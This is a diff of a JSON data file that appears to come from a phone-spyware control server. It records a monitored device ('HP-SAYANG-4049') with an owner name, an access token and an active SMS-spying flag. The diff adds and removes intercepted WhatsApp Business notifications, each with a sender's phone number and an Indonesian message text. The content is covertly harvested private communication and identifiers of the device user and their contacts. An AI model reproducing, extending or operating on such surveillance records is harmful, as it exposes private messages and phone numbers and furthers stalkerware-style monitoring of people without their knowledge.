@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775635059745,
+    "lastSeen": 1775635062835,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Gak ngerti gw",
+        "time": "08/04 14:57",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775635065282
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Cara lu aja sih",
+        "time": "08/04 14:57",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775635060965
+      },
       {
         "appName": "WA Business",
         "sender": "+62 898-7564-441",
@@ -4310,22 +4326,6 @@
         "time": "08/04 14:26",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633181744
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎97 pesan dari 4 chat",
-        "time": "08/04 14:26",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633181253
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "📡 Undangan admin saluran",
-        "time": "08/04 14:26",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633181109
       }
     ],
     "galleryPhotos": [],
